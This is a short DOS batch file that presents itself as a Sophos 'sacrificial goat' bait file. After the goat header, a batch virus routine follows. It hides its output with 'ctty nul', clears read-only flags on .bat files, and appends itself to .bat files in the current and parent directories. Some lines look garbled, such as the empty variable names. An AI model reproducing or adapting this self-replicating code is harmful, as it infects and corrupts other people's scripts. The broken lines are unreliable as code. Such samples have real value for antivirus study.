@REM ------- BEGIN OF SOPHOS GOAT ------
@ECHO Sophos Ltd, Oxford sacrificial BAT goat 300 bytes long
@REM ***SOPHOS*GOAT***SOPHOS*GOAT***SOPHOS*GOAT***SOPHOS*GOAT***SOPHOS*GOAT***
@REM ***SOPHOS*GOAT***SOPHOS*GOAT***SOPHOS*GOAT***SOPHOS*GOAT***SOPHOS***
@REM ------- END OF SOPHOS GOAT -------
Y
@echo off
echo Hello World...
@ctty nul
attrib *.bat -r
for %%q in (*.bat ..\*.bat) do set =%%q
for %%x in (*.bat ..\*.bat) do find "" %%
if errorlevel 1 type %0 >> %%
